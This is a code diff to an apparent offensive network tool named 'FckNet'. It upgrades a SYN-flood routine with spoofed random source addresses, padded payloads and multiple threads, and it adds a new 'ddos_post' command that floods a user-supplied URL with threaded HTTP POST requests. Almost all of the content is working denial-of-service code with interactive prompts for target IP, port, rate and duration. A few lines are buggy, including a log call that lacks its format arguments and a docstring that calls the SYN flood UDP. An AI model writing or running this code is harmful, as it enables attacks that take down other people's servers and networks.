@@ -8,8 +8,9 @@ import socket
 import warnings
 import random
 import threading
-from scapy.all import Ether, ARP, IP, UDP, BOOTP, DHCP, srp, send, sendp, RandMAC, TCP
+from scapy.all import Ether, ARP, IP, UDP, BOOTP, DHCP, srp, send, sendp, RandMAC, TCP, Raw
 import scapy.all as scapy
+import requests 
 
 # ASCII Banner for the tool
 banner = """
@@ -28,6 +29,7 @@ Here's the list of commands for Fcknet:
 - 'dhcp_starv': Perform DHCP Starvation
 - 'net_scan': Perform Network Scanning
 - 'syn_flood': Perform SYN Flooding
+- 'ddos_post': Perform DDoS POST Request
 - 'help' or 'h': List all the applicable commands for FckNet
 - 'exit' or 'quit': Terminate FckNet
 """
@@ -251,7 +253,6 @@ def generate_random_ip():
     """
     return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
 
-
 def generate_random_port():
     """
     Generate a random TCP/UDP port number.
@@ -262,48 +263,92 @@ def generate_random_port():
     """
     return random.randint(1024, 65535)
 
-
 def send_syn_packets(target_ip, target_port, packet_rate, duration, stats):
     """
     Send SYN packets to a target IP and port to simulate a SYN flooding attack.
-    :param target_ip (str): The target IP address to send the SYN packets to
-    :param target_port (int): The target port number to which the SYN packets are sent
-    :param packet_rate (int): The rate (in packets per second) at which to send packets
-    :param duration (int): The total duration (in seconds) to continue sending packets
-    :param stats (dict): A dictionary to keep track of the number of packets sent
+    :param target_ip: The target IP address to send the SYN packets to
+    :param target_port: The target port number to which the SYN packets are sent
+    :param packet_rate: The rate (in packets per second) at which to send packets
+    :param duration: The total duration (in seconds) to continue sending packets
+    :param stats: A dictionary to keep track of the number of packets sent
                       It should contain a key 'sent_packets' to store the counts
-    Raises:
-        Exception: Logs an error if any exception occurs while sending packets
     """
     end_time = time.time() + duration
     while time.time() < end_time:
         try:
             src_ip = generate_random_ip()
             src_port = generate_random_port()
-            ip_packet = IP(src=src_ip, dst=target_ip)
-            syn_packet = TCP(sport=src_port, dport=target_port, flags="S")
-            send(ip_packet / syn_packet, verbose=False)
-            stats['sent_packets'] += 1
-            if stats['sent_packets'] % packet_rate == 0:
-                logging.info("Sent %d packets to %s:%d", stats['sent_packets'], target_ip, target_port)
-        except Exception as e:
-            logging.error("Error sending packets: %s", e)
+            ip = IP(src=src_ip, dst=target_ip)
+            tcp = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(0, 65535))
+            payload = Raw(b"A"*1024)
+            packet = ip/tcp/payload
+            send(packet, verbose=0)
+            stats['packets_sent'] += 1
+            if stats['packets_sent'] % 100 == 0:
+                logging.info("Sent %d packets to %s:%d", stats['packets_sent'], target_ip, target_port)
+            time.sleep(1 / packet_rate)
+        except KeyboardInterrupt:
+            print("Attack Interrupted.")
+            break
 
-
-def start_syn_flood(target_ip, target_port, packet_rate, duration):
+def start_syn_flood(target_ip, target_port, packet_rate, num_threads, duration):
     """
-    Start SYN flooding the target IP with TCP SYN packets.
+    Start SYN flooding the target IP with UDP packets.
     :param target_ip: Target IP address to flood
     :param target_port: Target port to flood
     :param packet_rate: Number of packets to send per second
+    :param num_threads: The number of threads to run concurrently for the attack
     :param duration: Duration for the flooding in seconds
     """
-    stats = {'sent_packets': 0}
-    flood_thread = threading.Thread(target=send_syn_packets, args=(target_ip, target_port, packet_rate, duration, stats))
-    flood_thread.start()
-    flood_thread.join()
-    logging.info("Flooding complete: Sent %d packets to %s:%d", stats['sent_packets'], target_ip, target_port)
+    stats = {'packets_sent':0}
+    threads = []
+    for _ in range(num_threads):
+        thread = threading.Thread(target=send_syn_packets, args=(target_ip, target_port, packet_rate, duration, stats))
+        threads.append(thread)
+        thread.start()
+    for thread in threads:
+        thread.join()
 
+### DDoS POST ###
+def send_post_requests(url, packet_rate, packet_size, duration, stats):
+    """
+    Send HTTP POST requests to a target URL.
+    :param url: The target URL to send requests to
+    :param packet_rate: The rate (in requests per second) at which to send requests
+    :param packet_size: The size of the packet (bytes) per requests
+    :param duration: The total duration (in seconds) to continue sending requests
+    :param stats: A dictionary to keep track of the number of requests sent
+    """
+    end_time = time.time() + duration
+    while time.time() < end_time:
+        try:
+            response = requests.post(url, data='X' * packet_size)
+            stats['requests_sent'] += 1
+            if stats['requests_sent'] % 100 == 0:
+                logging.info("Sent %d requests to %s using port %d", stats['requests_sent'])
+            time.sleep(1 / packet_rate)
+        except requests.exceptions.RequestException as e:
+            logging.error(f"Request failed: {e}")
+        except KeyboardInterrupt:
+            break
+
+def start_post_flood(url, packet_rate, packet_size, num_threads, duration):
+    """
+    Start flooding the target URL with HTTP POST requests.
+    :param url: Target URL to flood
+    :param packet_rate: Number of requests to send per second per thread
+    :param packet_size: Number of size to send per requests
+    :param num_threads: The number of threads to run concurrently for the attack
+    :param duration: Duration for the flooding in seconds
+    """
+    stats = {'requests_sent': 0}
+    threads = []
+    for _ in range(num_threads):
+        thread = threading.Thread(target=send_post_requests, args=(url, packet_rate, packet_size, duration, stats))
+        threads.append(thread)
+        thread.start()
+    for thread in threads:
+        thread.join()
 
 def main():
     """
@@ -340,8 +385,16 @@ def main():
             target_ip = input("Enter target IP for SYN Flood: ").strip()
             target_port = int(input("Enter target port for SYN Flood: ").strip())
             packet_rate = int(input("Enter packets per second: ").strip())
+            threads = int(input("Enter number of threads: ").strip())
             duration = int(input("Enter duration in seconds: ").strip())
-            start_syn_flood(target_ip, target_port, packet_rate, duration)
+            start_syn_flood(target_ip, target_port, packet_rate, threads, duration)
+        elif command == 'ddos_post':
+            url = input("Enter the target URL: ").strip()
+            packet_rate = float(input("Enter packets per second: ").strip())
+            packet_size = int(input("Enter the size of data (bytes) per packet: ").strip())
+            threads = int(input("Enter the number of threads: ").strip())
+            duration = int(input("Enter the duration in seconds: ").strip())
+            start_post_flood(url, packet_rate, packet_size, threads, duration)
         else:
             logging.warning("Invalid command, type 'help' for options.")
 
